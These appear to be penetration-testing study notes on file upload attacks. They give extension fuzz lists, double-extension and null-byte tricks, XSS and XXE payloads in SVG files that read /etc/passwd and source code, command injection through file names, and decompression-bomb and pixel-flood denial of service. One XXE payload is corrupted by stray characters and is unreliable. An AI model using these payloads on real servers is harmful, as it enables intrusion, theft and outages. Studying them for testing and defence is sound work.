# Bypassing Filters

## Client-side Validation
All client-side validation is under our control. Simply modify the upload request to the back-end server or manipulate the front-end code to disable these type validations.

### Back-end Request Modification
![[Pasted image 20240628114633.png]]
Two important parts of a file upload are `filename` and the file content. 

### Disabling Front-end Validation

Go into Page Inspector and modify the "accept" argument to include .php.

## Blacklist Filters
### Blacklisting Extensions
There are two traditional ways of validating a file extension on the back-end:

1. Testing against a `blacklist` of types
2. Testing against a `whitelist` of types

The validation may also check the file type or file content for the type matching.

#### Fuzzing Extensions

***PAYLOAD ALL THE THINGS***

PHP
```
.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
```

.NET
```
shell.asa
shell.ashx
shell.asmx
shell.asp
shell.aspx
shell.cer
shell.soap
shell.xamlx
```


## Whitelist Filters

### Whitelisting Extensions

`Example of whitelist PHP code`
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

#### Double Extensions

Modify the filename to include another extension.

```
shell.jpg.php
```

However, this may not always work, as some web applications may use a strict `regex` pattern, as mentioned earlier, like the following:

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

#### Reverse Double Extension

```
shell.php.jpg
```

#### Character Injection
We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.

``` url
%20
%0a
%00
%0d0a
/
.\
.
â€¦
:
```

Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (`shell.php%00.jpg`) works with PHP servers with version `5.X` or earlier, as it causes the PHP web server to end the file name after the (`%00`), and store it as (`shell.php`), while still passing the whitelist. The same may be used with web applications hosted on a Windows server by injecting a colon (`:`) before the allowed file extension (e.g. `shell.aspx:.jpg`), which should also write the file as (`shell.aspx`). Similarly, each of the other characters has a use case that may allow us to upload a PHP script while bypassing the type validation test.

## Type Filters

### Content Type
The following is an example of how a PHP web application tests the Content-Type header to validate the file type:

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

#### Fuzzing
Can fuzz the content-type with Seclists

```
/usr/share/wordlists/seclists/Miscellaneous/web/content-type.txt
```

### MIME Type

The following example shows how a PHP web application can test the MIME type of an uploaded file:

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

We can use a combination of the two methods discussed in this section, which may help us bypass some more robust content filters. For example, we can try using an `Allowed MIME type with a disallowed Content-Type`, an `Allowed MIME/Content-Type with a disallowed extension`, or a `Disallowed MIME/Content-Type with an allowed extension`, and so on. Similarly, we can attempt other combinations and permutations to try to confuse the web server, and depending on the level of code security, we may be able to bypass various filters.

# Limited File Uploads

## XSS

Many file types may allow us to introduce a `Stored XSS` vulnerability to the web application by uploading maliciously crafted versions of them.

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

Furthermore, if we change the image's MIME-Type to `text/html`, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

## XXE

Similar attacks can be carried to lead to XXE exploitation. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server. The following example can be used for an SVG image that leaks the content of (`/etc/passwd`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE    ++++++++++++++++++++++svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Using XML data is not unique to SVG images, as it is also utilized by many types of documents, like `PDF`, `Word Documents`, `PowerPoint Documents`, among many others. All of these documents include XML data within them to specify their format and structure. Suppose a web application used a document viewer that is vulnerable to XXE and allowed uploading any of these documents. In that case, we may also modify their XML data to include the malicious XXE elements, and we would be able to carry a blind XXE attack on the back-end web server.
## DOS

We can utilize a `Decompression Bomb` with file types that use data compression, like `ZIP` archives. If a web application automatically unzips a ZIP archive, it is possible to upload a malicious archive containing nested ZIP archives within it, which can eventually lead to many Petabytes of data, resulting in a crash on the back-end server.

Another possible DoS attack is a `Pixel Flood` attack with some image files that utilize image compression, like `JPG` or `PNG`. We can create any `JPG` image file with any image size (e.g. `500x500`), and then manually modify its compression data to say it has a size of (`0xffff x 0xffff`), which results in an image with a perceived size of 4 Gigapixels. When the web application attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.

# Other Upload Attacks

## Injections in File Name

A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed (i.e., reflected) on the page. We can try injecting a command in the file name, and if the web application uses the file name within an OS command, it may lead to a command injection attack.

For example, if we name a file `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`, and then the web application attempts to move the uploaded file with an OS command (e.g. `mv file /tmp`), then our file name would inject the `whoami` command, which would get executed, leading to remote code execution. You may refer to the [Command Injections](https://academy.hackthebox.com/module/details/109) module for more information.

## Upload Directory Disclosure

In some file upload forms, like a feedback form or a submission form, we may not have access to the link of our uploaded file and may not know the uploads directory. In such cases, we may utilize fuzzing to look for the uploads directory or even use other vulnerabilities (e.g., LFI/XXE) to find where the uploaded files are by reading the web applications source code, as we saw in the previous section. Furthermore, the [Web Attacks/IDOR](https://academy.hackthebox.com/module/details/134) module discusses various methods of finding where files may be stored and identifying the file naming scheme.

## Windows Specific Attacks
We can also use a few `Windows-Specific` techniques in some of the attacks we discussed in the previous sections.

One such attack is using reserved characters, such as (`|`, `<`, `>`, `*`, or `?`), which are usually reserved for special uses like wildcards. If the web application does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory. Similarly, we may use Windows reserved names for the uploaded file name, like (`CON`, `COM1`, `LPT1`, or `NUL`), which may also cause an error as the web application will not be allowed to write a file with this name.

Finally, we may utilize the Windows [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing files or refer to files that do not exist. Older versions of Windows were limited to a short length for file names, so they used a Tilde character (`~`) to complete the file name, which we can use to our advantage.

For example, to refer to a file called (`hackthebox.txt`) we can use (`HAC~1.TXT`) or (`HAC~2.TXT`), where the digit represents the order of the matching files that start with (`HAC`). As Windows still supports this convention, we can write a file called (e.g. `WEB~.CONF`) to overwrite the `web.conf` file. Similarly, we may write a file that replaces sensitive system files. This attack can lead to several outcomes, like causing information disclosure through errors, causing a DoS on the back-end server, or even accessing private files.
